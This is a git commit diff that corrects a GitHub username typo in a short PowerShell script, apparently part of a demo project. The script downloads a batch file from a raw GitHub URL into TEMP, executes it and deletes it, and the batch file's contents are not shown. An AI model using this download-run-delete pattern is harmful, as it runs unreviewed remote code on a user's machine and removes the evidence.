531c4c6ab5b864ee27d9a1b779def54fadd0ca90
crjtpp <119838914+crjtpp@users.noreply.github.com>
2022-12-07 17:00:02 +0900

    Update scan.ps1

--- sedemo01/scan.ps1
+++ sedemo01/scan.ps1
@@ -1,3 +1,3 @@
-Invoke-WebRequest "https://raw.githubusercontent.com/crjptpp/tpplab_public/main/sedemo01/scan.bat" -OutFile $env:TEMP\scan.bat
+Invoke-WebRequest "https://raw.githubusercontent.com/crjtpp/tpplab_public/main/sedemo01/scan.bat" -OutFile $env:TEMP\scan.bat
 Start-Process -Wait $env:TEMP\scan.bat
 Remove-Item $env:TEMP\scan.bat
